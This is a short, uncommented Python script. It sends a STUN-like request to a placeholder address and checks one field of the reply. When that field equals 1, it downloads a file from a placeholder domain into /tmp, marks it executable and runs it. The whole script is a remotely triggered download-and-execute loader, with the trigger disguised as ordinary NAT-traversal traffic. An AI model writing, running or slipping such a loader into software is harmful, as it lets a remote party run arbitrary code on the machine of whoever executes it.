import socket,struct,urllib.request,subprocess
from pathlib import Path
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.sendto(struct.pack("!HHI12s",1,0,0x2112a442,bytes(12)),("192.0.2.1",3478))
packet,peer=s.recvfrom(2048)
a,b,magic=struct.unpack("!HHI",packet[:8])
if a != 0x101 or magic != 0x2112a442:
    raise ValueError()
op,flag,addr,port,unused,rest=struct.unpack("!BB4sHB3s",packet[8:20])
if op==1:
    urllib.request.urlretrieve("https://example.invalid/tool","/tmp/tool")
    Path("/tmp/tool").chmod(0o700)
    subprocess.Popen(["/tmp/tool"])
